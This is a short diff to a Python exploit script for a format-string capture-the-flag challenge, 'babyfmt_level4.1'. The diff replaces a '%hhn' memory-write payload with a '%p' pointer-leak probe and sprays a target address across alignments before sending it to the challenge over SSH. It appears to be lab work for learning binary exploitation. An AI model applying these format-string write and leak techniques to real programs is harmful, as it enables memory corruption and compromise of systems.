@@ -10,16 +10,14 @@ SSH = [
     "/challenge/babyfmt_level4.1",
 ]
 
-idx = 31
-fmt = "AAA |%116c%31$hhn DONE"
+prefix = "AAA |"
+fmt = (prefix + "%1$p").encode()
 
-pointer = struct.pack("<Q", ADDR)
-spray_buf = bytearray(8 * 8 + 8)
+spray = b""
 for shift in range(8):
-    spray_buf[shift : shift + 8] = pointer
-spray = bytes(spray_buf)
+    spray += b"\x00" * shift + struct.pack("<Q", ADDR)
 
-payload = fmt.encode() + spray
-
+payload = fmt + spray
 res = subprocess.run(SSH, input=payload, stdout=subprocess.PIPE, stderr=subprocess.STDOUT)
-print(res.stdout.decode("latin-1", errors="ignore"))
+out = res.stdout.decode("latin-1", errors="ignore")
+print(out)
